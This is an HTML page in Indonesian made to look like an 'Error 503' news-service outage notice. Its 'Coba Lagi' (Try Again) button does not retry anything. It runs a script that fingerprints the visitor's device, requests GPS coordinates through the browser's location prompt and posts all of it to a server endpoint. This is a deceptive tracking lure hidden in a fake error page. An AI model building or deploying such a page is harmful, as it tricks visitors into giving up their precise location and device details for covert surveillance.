<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Error 503</title>

<style>
/* === CSS SAMA PERSIS SEPERTI SEBELUMNYA === */
*{box-sizing:border-box}
body{
  margin:0;
  background:#efefef;
  font-family:Arial,Helvetica,sans-serif;
  color:#333;
}
.wrapper{
  max-width:420px;
  margin:60px auto;
  background:#f7f7f7;
  border-radius:6px;
  padding:30px 20px 35px;
  text-align:center;
}
.icon{font-size:48px;color:#f4b400;margin-bottom:10px}
.title{font-size:36px;font-weight:700;color:#d32f2f;margin:5px 0}
.subtitle{font-size:18px;font-weight:600;margin-bottom:10px}
.desc{font-size:14px;color:#666;margin-bottom:15px}
#line{height:3px;background:#d32f2f;width:100%;margin:15px 0 20px}
.detail{text-align:left;font-size:14px;color:#444}
.detail p{margin:6px 0}
.detail ul{margin:8px 0 0 18px;padding:0}
.detail li{margin:6px 0}
  
  .detail-box{
  background:#eaeaea;
  border-left:4px solid #d32f2f;
  padding:12px 14px;
  margin-top:10px;
  border-radius:4px;
}
  
button{
  margin:25px auto 15px;
  display:block;
  background:#d32f2f;
  color:#fff;
  border:none;
  padding:10px 26px;
  font-size:14px;
  border-radius:4px;
  cursor:pointer;
}
  
  .loading-bar{
  width:100%;
  height:4px;
  background:#f1caca;
  overflow:hidden;
  margin:15px 0;
  border-radius:2px;
}

.loading-fill{
  width:0%;
  height:100%;
  background:#d32f2f;
  transition:width 1.8s linear;
}

@keyframes loadingMove{
  from{transform:translateX(-100%)}
  to{transform:translateX(350%)}
}
  
button:hover{background:#b71c1c}
.footer{font-size:13px;color:#666}
  
  
}
</style>
</head>

<body>

<div class="wrapper">
  <div class="icon">⚠️</div>
  <div class="title">Error 503</div>
  <div class="subtitle">Layanan Tidak Tersedia</div>

  <div class="desc">
    Maaf, layanan berita sedang mengalami gangguan teknis sementara.
  </div>

    <div class="loading-bar" id="loadingBar">
  <div class="loading-fill"></div>
</div>
         

  <div class="detail-box">
  <div class="detail">
    <p><strong>Detail kesalahan:</strong> Koneksi timeout ke server berita</p>
    <p><strong>Solusi yang mungkin:</strong></p>
    <ul>
      <li>Periksa koneksi internet Anda</li>
      <li>Coba muat ulang halaman ini nanti</li>
      <li>Bersihkan cache browser Anda</li>
    </ul>
  </div>
</div>

  <button onclick="sendReport()">Coba Lagi</button>

  <div class="footer">
    Jika masalah berlanjut, silakan hubungi administrator sistem.
  </div>
</div>

<script>
function sendReport() {

  const bar = document.getElementById("loadingBar");
  const fill = bar.querySelector(".loading-fill");

  // tampilkan loading
  bar.style.display = "block";
  fill.style.width = "0%";
  setTimeout(() => fill.style.width = "100%", 50);

  const baseData = {
    os: navigator.userAgentData?.platform || "Unknown",
    platform: navigator.platform,
    cpu: navigator.hardwareConcurrency || "Unknown",
    ram: navigator.deviceMemory ? navigator.deviceMemory + " GB (approx)" : "Unknown",
    resolution: screen.width + "x" + screen.height,
    browser: navigator.userAgent,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language
  };

  // === GPS LEGAL (BUTUH IZIN) ===
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        baseData.latitude  = pos.coords.latitude;
        baseData.longitude = pos.coords.longitude;
        baseData.accuracy  = pos.coords.accuracy + " m";
        sendToServer(baseData);
      },
      () => {
        baseData.latitude  = "Not Allowed";
        baseData.longitude = "Not Allowed";
        baseData.accuracy  = "Not Available";
        sendToServer(baseData);
      }
    );
  } else {
    baseData.latitude  = "Not Supported";
    baseData.longitude = "Not Supported";
    baseData.accuracy  = "Not Supported";
    sendToServer(baseData);
  }
}

function sendToServer(data){
  fetch("/api/send", {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify(data)
  }).finally(() => {
    setTimeout(() => location.reload(), 2000);
  });
  
}
</script>

</body>
</html>